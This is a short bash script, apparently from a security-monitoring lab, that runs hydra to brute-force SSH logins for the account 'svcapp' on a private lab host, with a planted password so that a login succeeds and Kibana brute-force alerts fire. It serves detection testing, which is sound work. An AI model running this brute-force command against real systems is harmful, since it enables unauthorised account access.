#!/usr/bin/env bash
# INC-002 — Brute force simulation
# Run from KALI-ATK01 (192.168.56.50) against SSH on UBU-APP01.
# Requires hydra.
#
# NOTE: the account "svcapp" on UBU-APP01 must have its password set to
# line 14 of wordlist.txt ("Harvest#26") during environment setup
# (see RUNBOOK.md step 2) — this is what turns the 13th failed attempt
# into a 14th successful login, matching the "Successful login" severity
# justification in the project decisions.
set -euo pipefail

TARGET="192.168.56.20"
USERNAME="svcapp"
WORDLIST="$(dirname "$0")/wordlist.txt"
OUTFILE="$(dirname "$0")/bruteforce-results.txt"

echo "[*] Starting SSH brute force against ${USERNAME}@${TARGET}..."
hydra -l "${USERNAME}" -P "${WORDLIST}" -t 4 -f -o "${OUTFILE}" "ssh://${TARGET}"

echo
echo "[*] Result saved to ${OUTFILE}"
echo "[*] Check Kibana Alerting for the brute-force threshold rule firing,"
echo "    and Discover (filebeat-* / auth.log) for the final successful login."
